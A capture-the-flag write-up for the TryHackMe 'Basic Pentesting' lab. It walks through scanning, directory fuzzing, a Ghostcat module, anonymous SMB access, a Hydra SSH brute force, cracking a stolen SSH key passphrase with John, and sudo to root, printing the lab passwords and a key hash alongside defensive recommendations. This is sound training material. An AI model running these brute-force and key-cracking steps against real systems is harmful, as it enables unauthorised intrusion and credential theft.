# Basic Pentesting

## Ping 
So let's ping the host first to check which OS we can expect depending in the ttl.
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ ping 10.10.214.159 -c 1                                             
PING 10.10.214.159 (10.10.214.159) 56(84) bytes of data.
64 bytes from 10.10.214.159: icmp_seq=1 ttl=63 time=55.9 ms

--- 10.10.214.159 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 55.941/55.941/55.941/0.000 ms

```
`ttl=63`, we're probably dealing with a Linux machine

## NMAP
We're running nmap on the host to discover all open TCP ports. We are saving all results from the NMAP scans with the `-oA` flag.
In this case we set the minimum rate to 2000 to speed up this process.
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap 10.10.214.159 -p- --min-rate 2000 -vv -oA initallports
```

### nmap results:
```sh

8009/tcp open  ajp13        syn-ack
8080/tcp open  http-proxy   syn-ack

```

## NMAP sC sV 
With the `-sC` and `-sV` we're performing running the default scripts for the running services and checking the versions:
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap 10.10.214.159 -p22,80,139,445,8009,8080 -sC -sV  --min-rate 2000 -vv -oA openscsv
```

### nmap results:

# SSH 
So, we have some information for the SSH service. 

SSH defautl SSH scripts are:
- sshv1: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
- ssh-hostey: Shows SSH hostkeys.

To get some more information we will run the `ssh-auth-methods` NSE script to check which authenticatoon methods are allowed for the SSH service on this host.               
                                     
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap -p22  10.10.214.159 --script ssh-auth-methods -oA sshalgos  
```
```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password

```

Nice, we know that the service allows password authentication which might be useful for a bruteforce attack later on.

### Security Recomendation
- It would be best to have only publickey authentication and disable password authentication

# 80 
Let's dig deeper in the different services running. We're starting with port 80 since webervers and webapplications can have a lot of different vulnerabilities which we can exploit.

When check the page-source of the page on port 80 we find a note:

```HTML
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>

```
Ah, some notes somewhere! Unfortunaly the `/dev/` directory does not exist. Let's enumerate some more

## Directory fuzzing with ffuf
```sh
──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.214.159/FUZZ -of html -o dirs80.html     -e .txt,.php,.html -v

```
With ffuf we found the `/development/directory` which corresponds to the note in the page source. Let's visit the directory in the browser to check what it's about

We find two notes:
- j.txt and
- dev.txt
 These might be the notes that we are looking for. Let's check them out:
 
### dev.txt
```txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

### j.txt


```txt


For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Valuable Information:
- User `J` has an easy to crack password...we keep that in mind

### Security Recomendation
-Make sure internal communication and notes are not publically available. 
-Also remove unnecessary notes from the HTML source code
-Consider if directory indexing is needed for production processes. Disable directory indexing if possible. (https://portswigger.net/kb/issues/00600100_directory-listing)

## whatweb
Next we will scan the server for used software and i'ts versions.

```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ whatweb http://10.10.214.159 -v -a1 > whatweb80.txt

```
### Whatweb Results
```sh
WhatWeb report for http://10.10.214.159
Status    : 200 OK
Title     : <None>
IP        : 10.10.214.159
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
```
This does not give us much information but we can see that the Apache version is out of date.

### Security Recommendation:
- Update the Apache version to a current supported version
- Implement a policy that checks reguraly for updates

## Nikto
For a more intrusive scan we use nikto. 
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ nikto --url http://10.10.214.15 -output nikto80.txt
```
## nikto results:
```sh
...
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: GET /development/: Directory indexing found.
+ OSVDB-3092: GET /development/: This might be interesting...
+ OSVDB-3233: GET /icons/README: Apache default file found.
...
```

As we could see before that the apache version is outdated and it shows us the `/development/` directory which we already found before.

# 8080
We will repeat the same process for port 8080:

## whatweb
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ whatweb http://10.10.214.159:8080 -v -a1 > whatweb8080.txt
```
```
WhatWeb report for http://10.10.214.159:8080
Status    : 200 OK
Title     : Apache Tomcat/9.0.7
IP        : 10.10.214.159
Country   : RESERVED, ZZ

Summary   : HTML5

```
Not much information here. We see that 

## nikto
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ nikto --url http://10.10.214.159:8080 -output nikto8080.txt

```

### nikto results
```sh
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ GET /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: GET /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ GET /manager/html: Default Tomcat Manager / Host Manager interface found
+ GET /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ GET /manager/status: Default Tomcat Server Status interface found

```

This gives us some information

### Security Recommendations
- disable unnecessary HTTP methods

# 8009 APJ
Let's enumerate the  Apache JServ Protocol (AJP)
```sh
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.214.159 -oA APJ
```

After some research it was found that this protocol is vulnerable for LFI (CVE-2020-1938). The vulnerability is called `Ghostcat`. This might expose some information

I ran the `admin/http/tomcat_ghostcat` metasploit module to read the `WEB-INF/web.xml` file. The exploit worked and I was able to read the file but there was no information in which we could use now.

## Security Recommendation
- Take the steps to mitigate the ghostcat vulnerability (https://www.synopsys.com/blogs/software-security/ghostcat-vulnerability-cve-2020-1938/)


# SMB 139, 445
Now it's time to enumerate the NETBIOS and SMB services.
## enum4linux
```sh
enum4linux-ng.py 10.10.214.159
```
The results are too long to put here. There was one interesting share found called `Anonymous`:
```sh
[*] Testing share Anonymous
[+] Mapping: OK, Listing: OK
```
Let's enumerate this share with the guest login with no password

```sh
smbclient //10.10.214.159/Anonymous -U guest
```

Here we find a note called `staff.txt` with the following contents:
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```

Now we know the names of `J` and `K`; Jan en Kay.

### Security Recommendations:
- Disable the Guest account
- Disable SMBv1 (found during enum4linux)



# Hydra
Yes now we have names and it was mentioned before that Jan had a easy to crack password. So let's brute force ssh:
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.214.159
```

At first I cut off the attack because it took to long and I thought this was not the way. But after a second try I had success and found the password:
```sh
[22][ssh] host: 10.10.202.02   login: jan   password: armando
```

### Security Recommendations:
- Disable Password Authentication
- Prevent bruteforce attacks: (https://www.tecmint.com/prevent-ssh-brute-force-login-attacks/)
- Use strong and unique passwords
                                  
# Login with ssh:
```
ssh jan@10.10.214.159
```

Yes! We're in!

### Security Recommendations:
-Implement two-factor authentication on the SSH service

We are not yet seeing a flag but we have access to Kay's home folder and even his ssh private key (/home/kay/.ssh/id_rsa).
There is also a file called `pass.bak` but we lack the permissions to read teh file. The filename seems very interresting though...
```sh
-rw------- 1 kay kay 57 Apr 23  2018 ../kay/pass.bak
```
Only the owner (kay) has read and write (rw) permissions.

### Security Recommendations:
- Implement a 'least privilege' policy to prevent unauthorized access to files of other users

# SSH as Kay
We save the key on our hostmachine and we can login as Kay on the server via SSH:
```sh
ssh kay@10.10.214.159 -i key
```
```sh
Enter passphrase for key 'key': 
```
Oh No! Next hurdle! We need a passphrase for the SSH key. Some security measures taken after all... I'm happy to see that

## Cracking SSH private key passphrase:
To crack the passphrase we have to extract the hash from the key. We can do that with `ssh2john`:
```sh
ssh2john key > johnkey 
```
Now we can try to crack the key with John The Ripper (The tool... we do not need to call a person)
```
john --wordlist=/usr/share/wordlists/rockyou.txt johnkey
```
Nice! We have success!
```sh
$sshng$1$16$6aba7de35cdb65070b92c1f760e2fe75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8$SOURCE_HASH$e043d490e9304fe1fc9e74c2dd78c629:beeswax
```

`beeswax` is the password. Hmm...maybe Kay himself should comply to the password policy.

### Security Recommendations:
- Secure the SSH private keys with strong passwords

## SSH as Kay (for real)
```sh
ssh kay@10.10.214.159 -i key
```
Submit the password and we have a shell as the user Kay.

Now we can read the `pass.bak` file. The contents are:
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
Let's be naughty and:
```sh
sudo su
```
Try the password and bingo!! <h1> WE ARE ROOT</h1>

### Security Recommendations:
- Do not store passwords in plain text. 
- Secure files containing passwords
